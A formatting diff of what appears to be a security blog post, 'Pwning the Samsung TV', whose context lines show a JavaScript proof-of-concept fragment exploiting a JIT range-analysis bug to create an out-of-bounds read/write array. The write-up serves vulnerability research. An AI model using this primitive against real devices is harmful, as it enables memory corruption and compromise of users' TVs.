@@ -1,5 +1,4 @@
 ---
-layout: single
 title: "Pwning the Samsung TV"
 date: "2022-01-28"
 categories: 
@@ -76,7 +75,6 @@ The bug leads to mismatch type of **i** in optimization engine and actual value 
 
 Below is a Proof-of-concept that creates OOB read/write JS array
 {% highlight javascript %}
-
                                        // i: kInteger > \[-Infinity, Infinity\]
     var value = Math.max(i, 1024);     // \[1024, Infinity\]
     value = -value;                    // \[-Infinity, -1024\]
@@ -85,7 +83,6 @@ Below is a Proof-of-concept that creates OOB read/write JS array
     value -= 1022;                     // \[2, 3\]
     value >>= 1;                       // 0
     value += 10;                       // 10
-
     var array = Array(value);
     array\[0\] = 1.1;
 {% endhighlight %}
